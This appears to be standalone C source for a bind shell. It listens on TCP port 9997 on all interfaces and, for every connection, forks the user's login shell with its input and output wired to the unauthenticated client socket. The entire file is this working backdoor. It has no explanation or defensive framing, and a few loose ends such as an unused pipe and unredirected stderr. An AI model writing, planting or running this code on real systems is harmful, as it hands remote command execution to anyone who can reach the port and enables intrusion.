#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <pthread.h>

#define PORT 9997
#define QUEUE_LENGTH 5

extern char **environ;


int main(int argc, char **argv) {
  int master_sock = socket(AF_INET, SOCK_STREAM, 0);
  if (master_sock < 0) {
    perror("socket error");
  }

  struct sockaddr_in server_addr = {0};
  server_addr.sin_addr.s_addr = INADDR_ANY;
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT);

  int reuse = 1;
  setsockopt(master_sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int));

  int status = bind(master_sock, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_in));
  if (status < 0) {
    perror("bind error");
  }

  status = listen(master_sock, QUEUE_LENGTH);
  if (status < 0) {
    perror("listen error");
  }

  while (1) {
    //accept
    struct sockaddr_in client_addr = {0};
    int client_addr_len = sizeof(client_addr);
    int client_sock = accept(master_sock, (struct sockaddr *)&client_addr, &client_addr_len);
    int inpipefd[2];
    int outpipefd[2];
    pipe(inpipefd);
    pipe(outpipefd);
    if (fork() == 0) {
      dup2(inpipefd[0], 0);
      dup2(client_sock, 1);
      char *shell = getenv("SHELL");
      char *argv[] = {shell, NULL};
      execvp(shell, argv);
    }
    char buf = {0};
    while (read(client_sock, &buf, 1) > 0) {
      if (buf != '\r') {
        write(inpipefd[1], &buf, 1);
      }
    }
    char exitmsg[] = "exit\n";
    write(inpipefd[1], exitmsg, sizeof(exitmsg));
    close(client_sock);
  }
}